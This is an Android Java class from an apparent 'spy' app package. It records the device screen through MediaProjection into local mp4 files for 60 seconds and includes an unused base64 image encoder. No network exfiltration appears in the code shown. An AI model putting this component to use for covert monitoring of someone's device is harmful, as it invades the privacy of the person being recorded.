package com.example.spy.tasks;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import com.example.spy.utils.Constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;

public class StreamScreen extends Thread {
    boolean flagStop = true;
    Context ctx;
    Handler mHandler;
    int resultCode;
    Intent data;
    public StreamScreen(Context ctx, Handler handler, int resultCode, Intent data){
        this.ctx = ctx;
        this.mHandler = handler;
        this.resultCode = resultCode;
        this.data = data;
    }

    private MediaProjection mMediaProjection;
    private MediaCodec.Callback encoderCallback;


    private static final String VIDEO_MIME_TYPE = "video/avc";

    long durationMicroseconds = 0;
    private boolean mMuxerStarted = false;
    private Surface mInputSurface;
    private MediaMuxer mMuxer;
    private MediaCodec mVideoEncoder;
    private MediaCodec.BufferInfo mVideoBufferInfo;
    private int mTrackIndex = -1;

    private final Handler mDrainHandler = new Handler(Looper.getMainLooper());


    private int trackIndex = -1;
    private String mStoreDir;

    private VirtualDisplay mVirtualDisplay;


    private final Handler waitHandler = new Handler();
    private final Runnable waitCallback = new Runnable() {
        @Override
        public void run() {
            releaseEncoders();
        }
    };

    private void startRecording() {
        File externalFilesDir = ctx.getExternalFilesDir(null);
        if (externalFilesDir != null) {
            mStoreDir = externalFilesDir.getAbsolutePath() + "/videorecords/";
            File storeDirectory = new File(mStoreDir);
            if (!storeDirectory.exists()) {
                boolean success = storeDirectory.mkdirs();
                if (!success) {
                    Log.e("TAG", "failed to create file storage directory.");
                }
            }
        } else {
            Log.e("TAG", "failed to create file storage directory, getExternalFilesDir is null.");
        }

        SystemClock.sleep(1000);
        MediaProjectionManager mpManager = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);


        if (mMediaProjection == null) {
            mMediaProjection = mpManager.getMediaProjection(resultCode, data);
            if (mMediaProjection != null) {

                DisplayManager dm = (DisplayManager)ctx.getSystemService(Context.DISPLAY_SERVICE);
                Display defaultDisplay = dm.getDisplay(Display.DEFAULT_DISPLAY);
                if (defaultDisplay == null) {
                    throw new RuntimeException("No display found.");
                }

                try {

                    mMuxer = new MediaMuxer(mStoreDir +"/Screen-record-" +
                            Long.toHexString(System.currentTimeMillis()) + ".mp4", MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
                } catch (IOException ioe) {
                    throw new RuntimeException("MediaMuxer creation failed", ioe);
                }

                // Get the display size and density.
                DisplayMetrics metrics = ctx.getResources().getDisplayMetrics();
                int screenWidth = metrics.widthPixels;
                int screenHeight = metrics.heightPixels;
                int screenDensity = metrics.densityDpi;

                encoderCallback = new MediaCodec.Callback() {
                    @Override
                    public void onInputBufferAvailable(@NonNull MediaCodec codec, int index) {
                        Log.d("TAG", "Input Buffer Avail");
                    }

                    @Override
                    public void onOutputBufferAvailable(@NonNull MediaCodec codec, int index, @NonNull MediaCodec.BufferInfo info) {
                        ByteBuffer encodedData = mVideoEncoder.getOutputBuffer(index);
                        if (encodedData == null) {
                            throw new RuntimeException("couldn't fetch buffer at index " + index);
                        }

                        if ((info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                            info.size = 0;
                        }

                        if (info.size != 0) {
                            if (mMuxerStarted) {
                                encodedData.position(info.offset);
                                encodedData.limit(info.offset + info.size);
                                mMuxer.writeSampleData(trackIndex, encodedData, info);
                            }
                        }

                        mVideoEncoder.releaseOutputBuffer(index, false);

                    }

                    @Override
                    public void onError(@NonNull MediaCodec codec, @NonNull MediaCodec.CodecException e) {
                        Log.e("TAG", "MediaCodec " + codec.getName() + " onError:", e);
                    }

                    @Override
                    public void onOutputFormatChanged(@NonNull MediaCodec codec, @NonNull MediaFormat format) {
                        Log.d("TAG", "Output Format changed");
                        if (trackIndex >= 0) {
                            throw new RuntimeException("format changed twice");
                        }
                        trackIndex = mMuxer.addTrack(mVideoEncoder.getOutputFormat());
                        if (!mMuxerStarted && trackIndex >= 0) {
                            mMuxer.start();
                            mMuxerStarted = true;
                        }
                    }
                };

                prepareVideoEncoder(screenWidth, screenHeight);

                // Start the video input.
                mVirtualDisplay = mMediaProjection.createVirtualDisplay("Recording Display", screenWidth,
                        screenHeight, screenDensity, 0 /* flags */, mInputSurface,
                        null /* callback */, null /* handler */);




                // register media projection stop callback
                mMediaProjection.registerCallback(new MediaProjectionStopCallback(), mHandler);

                if (flagStop){
                    //releaseEncoders();
                    waitHandler.postDelayed(waitCallback, 60000);
                }




            }
        }

    }

    private void prepareVideoEncoder(int width, int height) {
        mVideoBufferInfo = new MediaCodec.BufferInfo();


        MediaFormat format = MediaFormat.createVideoFormat(VIDEO_MIME_TYPE, width, height);
        int frameRate = 30; // 30 fps

        // Set some required properties. The media codec may fail if these aren't defined.
        format.setInteger(MediaFormat.KEY_COLOR_FORMAT,MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        format.setInteger(MediaFormat.KEY_BIT_RATE, 6000000); // 6Mbps
        format.setInteger(MediaFormat.KEY_FRAME_RATE, frameRate);
        format.setInteger(MediaFormat.KEY_CAPTURE_RATE, frameRate);
        format.setInteger(MediaFormat.KEY_REPEAT_PREVIOUS_FRAME_AFTER, 1000000 / frameRate);
        format.setInteger(MediaFormat.KEY_CHANNEL_COUNT, 1);
        format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); // 1 seconds between I-frames

        // Create a MediaCodec encoder and configure it. Get a Surface we can use for recording into.
        try {
            mVideoEncoder = MediaCodec.createEncoderByType(VIDEO_MIME_TYPE);
            mVideoEncoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);

            mInputSurface = mVideoEncoder.createInputSurface();
            mVideoEncoder.setCallback(encoderCallback);
            mVideoEncoder.start();
        } catch (IOException e) {
            releaseEncoders();
        }
    }


    private class MediaProjectionStopCallback extends MediaProjection.Callback {
        @Override
        public void onStop() {
            Log.e("TAG", "stopping projection.");
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    if (mVirtualDisplay != null) mVirtualDisplay.release();
                    mMediaProjection.unregisterCallback(MediaProjectionStopCallback.this);
                }
            });
        }
    }


    private void releaseEncoders() {
        if (mMuxer != null) {
            if (mMuxerStarted) {
                mMuxer.stop();
            }
            mMuxer.release();
            mMuxer = null;
            mMuxerStarted = false;
        }
        if (mVideoEncoder != null) {
            mVideoEncoder.stop();
            mVideoEncoder.release();
            mVideoEncoder = null;
        }
        if (mInputSurface != null) {
            mInputSurface.release();
            mInputSurface = null;
        }
        if (mMediaProjection != null) {
            mMediaProjection.stop();
            mMediaProjection = null;
        }
        mVideoBufferInfo = null;
        mTrackIndex = -1;
    }

    private String encodeImage(Bitmap bm) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] b = baos.toByteArray();
        return Base64.encodeToString(b, Base64.DEFAULT);
    }

    @Override
    public void run() {
        super.run();

        startRecording();
    }
}
